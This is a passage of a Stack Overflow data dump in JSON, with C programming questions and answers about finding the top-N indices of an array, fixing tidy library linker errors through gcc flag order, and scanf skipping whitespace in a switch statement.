"https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1499162836, "post_id": 44902286, "comment_id": 76782971, "body": "The return value of main is an indication for the OS about the program&#39;s status, 0 indicates fine, any other value indicates some error having occured..."}], "answers": [{"tags": [], "owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "is_accepted": true, "score": 0, "last_activity_date": 1499163646, "creation_date": 1499163646, "answer_id": 44903308, "question_id": 44902286, "link": "https://stackoverflow.com/questions/44902286/how-to-get-indices-of-top-n-values-of-an-array-in-c/44903308#44903308", "title": "How to get indices of top N values of an array in C", "body": "<p>This is just a matter of output...</p>\n\n<p>You output your latestly inserted values right while yet sorting. You get output <code>top[2] = 2</code> somewhere in your process, but later on, you shift the 2 out of the array by inserting new values <em>before</em>:</p>\n\n<pre><code>for (;j &gt; k; j--)\n{\n    top[j] = top[j-1]; // moves the 2 out with further iterations!\n}\n</code></pre>\n\n<p>What you have to do is output the sorted array <em>afterwards</em>:</p>\n\n<pre><code>} // for (i = 0; i &lt; N; ++i)\n\n// sorting finished now, so NOW output:\n\nfor (i = 0; i &lt; n; ++i)\n{\n    printf(\"top[%0d] = %0d (%f)\\n\", i, top[i], arr[top[i]]);\n}\n</code></pre>\n\n<p>And you'll see that your sorting actually worked as a charm...</p>\n"}], "owner": {"reputation": 13, "user_id": 8135098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LwOAN.jpg?s=128&g=1", "display_name": "sathyarokz", "link": "https://stackoverflow.com/users/8135098/sathyarokz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 218, "favorite_count": 0, "accepted_answer_id": 44903308, "answer_count": 1, "score": 0, "last_activity_date": 1499168903, "creation_date": 1499160977, "last_edit_date": 1499161356, "question_id": 44902286, "link": "https://stackoverflow.com/questions/44902286/how-to-get-indices-of-top-n-values-of-an-array-in-c", "title": "How to get indices of top N values of an array in C", "body": "<p>I got the c-code from following link </p>\n\n<p><a href=\"https://stackoverflow.com/questions/25459043/how-to-get-the-indices-of-top-n-values-of-an-array\">How to get the indices of top N values of an array?</a></p>\n\n<p>I have added input stimulus part to the above link code and developed the following c-model</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\nint main() {\n  double *arr =malloc(sizeof(double)*10);\n  int N=10;\n  int n =5;\n  int *top =malloc(sizeof(int)*10);\n  arr[0] = 0.00623; \n  arr[1] = 0.745;\n  arr[2] = 0.440;\n  arr[3] = 0.145;\n  arr[4] = 0.645;\n  arr[5] = 0.741;\n  arr[6] = 0.542;\n  arr[7] = 0.445;\n  arr[8] = 0.146;\n  arr[9] = 0.095;\n  top[0] = 100;\n  top[1] = 100;\n  top[2] = 100;\n  top[3] = 100;\n  top[4] = 100;\n  int top_count = 0;\n  int i;\n  for (i=0;i&lt;N;++i) {\n\n    // invariant: arr[top[0]] &gt;= arr[top[1]] &gt;= .... &gt;= arr[top[top_count-1]]\n    // are the indices of the top_count larger values in arr[0],...,arr[i-1]\n    // top_count = max(i,n);\n    int k;\n\n    for (k=top_count;k&gt;0 &amp;&amp; arr[i]&gt;arr[top[k-1]];k--){\n\n    }\n    // i should be inserted in position k\n\n    if (k&gt;=n) continue; // element arr[i] is not in the top n\n    // shift elements from k to top_count\n    int j=top_count;\n    if (j&gt;n-1) { // top array is already full\n      j=n-1;\n\n    } else { // increase top array\n      top_count++;\n    }\n\n    for (;j&gt;k;j--) {\n      top[j]=top[j-1];\n    }\n    // insert i\n    top[k] = i;\n    printf(\"top[%0d] = %0d\\n\",k,top[k]);\n\n\n  }\n  return top_count;\n}\n</code></pre>\n\n<p>After executing the code, I am getting following output</p>\n\n<pre><code>top[0] = 0\ntop[0] = 1\ntop[1] = 2\ntop[2] = 3\ntop[1] = 4\ntop[1] = 5\ntop[3] = 6\ntop[4] = 7\n</code></pre>\n\n<p>The index is wrong for <code>top[2]</code>. It should be <code>top[2] =4</code>. I am not able to decode why it is giving problem for only <code>top[2]</code>?</p>\n"}, {"tags": ["c", "gcc", "tidy"], "comments": [{"owner": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 1, "creation_date": 1499161364, "post_id": 44902138, "comment_id": 76781968, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/12573816/what-is-an-undefined-reference-unresolved-external-symbol-error-and-how-do-i-fix\">What is an undefined reference/unresolved external symbol error and how do I fix it?</a>"}, {"owner": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1499161383, "post_id": 44902138, "comment_id": 76781986, "body": "See <a href=\"https://stackoverflow.com/a/12574400/1362568\">this answer</a> to <a href=\"https://stackoverflow.com/q/12573816/1362568\">this question</a>"}, {"owner": {"reputation": 417, "user_id": 5350324, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5dl1qeajwIA/AAAAAAAAAAI/AAAAAAAAABg/U_n6A4QCiUc/photo.jpg?sz=128", "display_name": "SilentFlame", "link": "https://stackoverflow.com/users/5350324/silentflame"}, "reply_to_user": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1499168091, "post_id": 44902138, "comment_id": 76786566, "body": "tried the approaches it mentioned, none seems to work for me."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1499283133, "post_id": 44902138, "comment_id": 76845081, "body": "Or, even more saliently, an <a href=\"https://stackoverflow.com/a/43305704/15168\">answer</a> about link order of libraries and object files by one @MikeKinghan, in the same &quot;What is an undefined reference\u2026&quot; question.  Presumably he&#39;d forgotten about that \u2014 it&#39;s a little lower down the list of answers."}], "answers": [{"comments": [{"owner": {"reputation": 417, "user_id": 5350324, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5dl1qeajwIA/AAAAAAAAAAI/AAAAAAAAABg/U_n6A4QCiUc/photo.jpg?sz=128", "display_name": "SilentFlame", "link": "https://stackoverflow.com/users/5350324/silentflame"}, "edited": false, "score": 0, "creation_date": 1499165292, "post_id": 44902213, "comment_id": 76784623, "body": "It gives the same output even when I use <b>-ltidy</b> with my command.  and for the later one, I don&#39;t see a tidy-tidy file/directory in my &quot;/usr/local/lib&quot;."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 417, "user_id": 5350324, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5dl1qeajwIA/AAAAAAAAAAI/AAAAAAAAABg/U_n6A4QCiUc/photo.jpg?sz=128", "display_name": "SilentFlame", "link": "https://stackoverflow.com/users/5350324/silentflame"}, "edited": false, "score": 0, "creation_date": 1499169043, "post_id": 44902213, "comment_id": 76787316, "body": "First of all: where is libtidy installed?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499180988, "post_id": 44902213, "comment_id": 76795219, "body": "Libraries should be listed <i>after</i> source or object files, not before.  On some systems and with some libraries, it won&#39;t matter.  On other systems, it will matter.  Hence: <code>gcc -I&#47;usr&#47;include&#47;tidy tidy_example.c -ltidy</code> will work (if there is a <code>libtidy.a</code> or <code>libtidy.so</code> in a library directory that&#39;s searched by the linker anyway.  If it is in an obscure directory, you may need <code>gcc -I&#47;opt&#47;tidy&#47;include -o tidy_example tidy_example.c -L&#47;opt&#47;tidy&#47;lib -ltidy</code>.  The <code>-L</code> option can be placed anywhere before the <code>-l</code> option."}, {"owner": {"reputation": 417, "user_id": 5350324, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5dl1qeajwIA/AAAAAAAAAAI/AAAAAAAAABg/U_n6A4QCiUc/photo.jpg?sz=128", "display_name": "SilentFlame", "link": "https://stackoverflow.com/users/5350324/silentflame"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499272311, "post_id": 44902213, "comment_id": 76838977, "body": "@JonathanLeffler the above mentioned <b>gcc -I/usr/include/tidy tidy_example.c -ltidy</b> does work. Thanks you for the help. But would like to know why keeping <code>-ltidy</code> before <code>tidy_example.c</code> does not work?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 417, "user_id": 5350324, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5dl1qeajwIA/AAAAAAAAAAI/AAAAAAAAABg/U_n6A4QCiUc/photo.jpg?sz=128", "display_name": "SilentFlame", "link": "https://stackoverflow.com/users/5350324/silentflame"}, "edited": false, "score": 0, "creation_date": 1499282877, "post_id": 44902213, "comment_id": 76844937, "body": "@SilentFlame: there are definitely other questions that cover this.  Succinctly, when the linker scans the library looking for symbols, if it does not find any currently undefined symbols, it ignores (or can ignore) the library.  With static libraries, it strictly ignores it; it pulls no information in.  With shared libraries, sometimes the linker remembers what was defined and if a symbol the shared library defines is later needed, it will list the library as a dependency after all.  Sometimes it doesn&#39;t.  Assuming your tidy library is a shared object, yours doesn&#39;t."}], "tags": [], "owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "is_accepted": false, "score": 2, "last_activity_date": 1499181180, "last_edit_date": 1499181180, "creation_date": 1499160781, "answer_id": 44902213, "question_id": 44902138, "link": "https://stackoverflow.com/questions/44902138/undefined-reference-errors-while-using-tidy-library-especially-tidy-h/44902213#44902213", "title": "&quot;undefined reference&quot; errors while using tidy library, especially &quot;tidy.h&quot;", "body": "<p>You forgot to link the lib using <code>-l</code> option.</p>\n\n<p>For example</p>\n\n<pre><code>gcc -I/usr/include/tidy -ltidy tidy_example.c -o example\n</code></pre>\n\n<p>If you also need to specify a specific folder for libs you must add <code>-L</code> option like</p>\n\n<pre><code>gcc -I/usr/include/tidy -L/usr/local/lib/tidy -ltidy tidy_example.c -o example\n</code></pre>\n"}], "owner": {"reputation": 417, "user_id": 5350324, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-5dl1qeajwIA/AAAAAAAAAAI/AAAAAAAAABg/U_n6A4QCiUc/photo.jpg?sz=128", "display_name": "SilentFlame", "link": "https://stackoverflow.com/users/5350324/silentflame"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 572, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1499181423, "creation_date": 1499160582, "last_edit_date": 1499181423, "question_id": 44902138, "link": "https://stackoverflow.com/questions/44902138/undefined-reference-errors-while-using-tidy-library-especially-tidy-h", "title": "&quot;undefined reference&quot; errors while using tidy library, especially &quot;tidy.h&quot;", "body": "<p>I'm currently using a script which validates an invalid <code>XML</code> file or string using <code>tidy library</code>.</p>\n\n<p>A sample code to test it's running:</p>\n\n<pre><code>#include &lt;tidy.h&gt;\n#include &lt;tidybuffio.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;errno.h&gt;\n\nint main(int argc, char **argv )\n{\n  const char* input = \"&amp;lt;title&amp;gt;Foo&amp;lt;/title&amp;gt;&amp;lt;p&amp;gt;Foo!\";\n  TidyBuffer output = {0};\n  TidyBuffer errbuf = {0};\n  int rc = -1;\n  Bool ok;\n\n  TidyDoc tdoc = tidyCreate();                     // Initialize \"document\"\n  printf( \"Tidying:\\t%s\\n\", input );\n\n  ok = tidyOptSetBool( tdoc, TidyXhtmlOut, yes );  // Convert to XHTML\n  if ( ok )\n    rc = tidySetErrorBuffer( tdoc, &amp;errbuf );      // Capture diagnostics\n  if ( rc &gt;= 0 )\n    rc = tidyParseString( tdoc, input );           // Parse the input\n  if ( rc &gt;= 0 )\n    rc = tidyCleanAndRepair( tdoc );               // Tidy it up!\n  if ( rc &gt;= 0 )\n    rc = tidyRunDiagnostics( tdoc );               // Kvetch\n  if ( rc &gt; 1 )                                    // If error, force output.\n    rc = ( tidyOptSetBool(tdoc, TidyForceOutput, yes) ? rc : -1 );\n  if ( rc &gt;= 0 )\n    rc = tidySaveBuffer( tdoc, &amp;output );          // Pretty Print\n\n  if ( rc &gt;= 0 )\n  {\n    if ( rc &gt; 0 )\n      printf( \"\\nDiagnostics:\\n\\n%s\", errbuf.bp );\n    printf( \"\\nAnd here is the result:\\n\\n%s\", output.bp );\n  }\n  else\n    printf( \"A severe error (%d) occurred.\\n\", rc );\n\n  tidyBufFree( &amp;output );\n  tidyBufFree( &amp;errbuf );\n  tidyRelease( tdoc );\n  return rc;\n}\n</code></pre>\n\n<p>on running </p>\n\n<blockquote>\n  <p>gcc -I/usr/include/tidy tidy_example.c</p>\n</blockquote>\n\n<p>I get this output on my terminal:</p>\n\n<blockquote>\n  <p>/tmp/cclFfP4I.o: In function <code>main':\n  tidy_exa.c:(.text+0x6e): undefined reference to</code>tidyCreate'\n  tidy_exa.c:(.text+0x9e): undefined reference to <code>tidyOptSetBool'\n  tidy_exa.c:(.text+0xba): undefined reference to</code>tidySetErrorBuffer'\n  tidy_exa.c:(.text+0xd6): undefined reference to <code>tidyParseString'\n  tidy_exa.c:(.text+0xeb): undefined reference to</code>tidyCleanAndRepair'\n  tidy_exa.c:(.text+0x100): undefined reference to <code>tidyRunDiagnostics'\n  tidy_exa.c:(.text+0x11f): undefined reference to</code>tidyOptSetBool'\n  tidy_exa.c:(.text+0x149): undefined reference to <code>tidySaveBuffer'\n  tidy_exa.c:(.text+0x1a6): undefined reference to</code>tidyBufFree'\n  tidy_exa.c:(.text+0x1b2): undefined reference to <code>tidyBufFree'\n  tidy_exa.c:(.text+0x1be): undefined reference to</code>tidyRelease'\n  collect2: error: ld returned 1 exit status</p>\n</blockquote>\n\n<p>Any Idea as to how to resolve this issue, or any other library to do the same thing on a file or a string (invalid XML) in c/c++.</p>\n\n<p>Any suggestions will also be welcomed.</p>\n"}, {"tags": ["c", "pointers", "switch-statement"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1499160291, "post_id": 44901966, "comment_id": 76781189, "body": "Are you complaining about flushing?"}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 2, "creation_date": 1499160416, "post_id": 44901966, "comment_id": 76781278, "body": "You mean entering some whitespace, then pressing enter? Well, scanf will skip whitespace, so you read nothing in and stay within scanf until you enter some non-whitespace..."}, {"owner": {"reputation": 30168, "user_id": 5612562, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/gzBQY.jpg?s=128&g=1", "display_name": "msc", "link": "https://stackoverflow.com/users/5612562/msc"}, "edited": false, "score": 0, "creation_date": 1499160492, "post_id": 44901966, "comment_id": 76781328, "body": "It&#39;s working fine in GCC compiler on Linux platform."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 2, "creation_date": 1499160773, "post_id": 44901966, "comment_id": 76781532, "body": "Just a side note: You don&#39;t really need <code>malloc</code> here, you can simply have: <code>char c[128];</code> instead..."}], "answers": [{"comments": [{"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "edited": false, "score": 1, "creation_date": 1499160653, "post_id": 44902152, "comment_id": 76781448, "body": "Dont answer a duplicate question"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "reply_to_user": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "edited": false, "score": 0, "creation_date": 1499160873, "post_id": 44902152, "comment_id": 76781619, "body": "@VishwajeetVishu You may be right :)"}, {"owner": {"reputation": 2003, "user_id": 3430463, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f04eedb575348268930ab5d638144581?s=128&d=identicon&r=PG&f=1", "display_name": "7hibault", "link": "https://stackoverflow.com/users/3430463/7hibault"}, "reply_to_user": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "edited": false, "score": 2, "creation_date": 1499160980, "post_id": 44902152, "comment_id": 76781691, "body": "@VishwajeetVishu You&#39;re right though, I shouldn&#39;t have answered it, I&#39;ll be more cautious next time and stick to the flag/comments <a href=\"https://meta.stackexchange.com/questions/10841/how-should-duplicate-questions-be-handled\" title=\"how should duplicate questions be handled\">meta.stackexchange.com/questions/10841/&hellip;</a>"}, {"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "reply_to_user": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1499161167, "post_id": 44902152, "comment_id": 76781821, "body": "@underscore_d see easy 25 reputation :/"}], "tags": [], "owner": {"reputation": 2003, "user_id": 3430463, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f04eedb575348268930ab5d638144581?s=128&d=identicon&r=PG&f=1", "display_name": "7hibault", "link": "https://stackoverflow.com/users/3430463/7hibault"}, "is_accepted": true, "score": 1, "last_activity_date": 1499160622, "creation_date": 1499160622, "answer_id": 44902152, "question_id": 44901966, "link": "https://stackoverflow.com/questions/44901966/c-switch-default-case-not-triggering/44902152#44902152", "title": "C Switch default case not triggering", "body": "<p>As other users pointed out: <a href=\"https://stackoverflow.com/questions/1247989/how-do-you-allow-spaces-to-be-entered-using-scanf\">scanf ignores whitespaces, fgets doesn't.</a></p>\n\n<pre><code>void processCommand(){\n    char *c = malloc(sizeof(char) * 128);\n    fgets (c, sizeof(char) * 128, stdin);\n\n    switch(*c){\n        case '!': \n            printf(\"Action\");\n            break;\n        case '?': \n            printf(\"Question\");\n            break;\n        default: \n            printf(\"Unknown Action\");\n            break;\n        }\n}\n</code></pre>\n"}], "owner": {"reputation": 1672, "user_id": 6400278, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/c6f7a62f444c778461382d9562b6b322?s=128&d=identicon&r=PG&f=1", "display_name": "TanguyB", "link": "https://stackoverflow.com/users/6400278/tanguyb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "closed_date": 1499160807, "accepted_answer_id": 44902152, "answer_count": 1, "score": 0, "last_activity_date": 1499160622, "creation_date": 1499160085, "last_edit_date": 1499160462, "question_id": 44901966, "link": "https://stackoverflow.com/questions/44901966/c-switch-default-case-not-triggering", "closed_reason": "Duplicate", "title": "C Switch default case not triggering", "body": "<p>I'm stuck at a pretty awkward thing. Here's the code: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid processCommand(){\n    char *c = malloc(sizeof(char) * 128);\n\n    scanf(\"%s\", c);\n\n    switch(*c){\n    case '!': \n        printf(\"Action\");\n        break;\n    case '?': \n        printf(\"Question\");\n        break;\n    default: \n        printf(\"Unknown Action\");\n        break;\n    }\n}\n</code></pre>\n\n<p>So what I want is, if the first char of my input is something different than <code>!</code> or <code>?</code>, it should just say it's an unknown action. So it works for typing other characters, but everytime i type a whitespace / tab / nothing, it doesn't do anything ?</p>\n"}]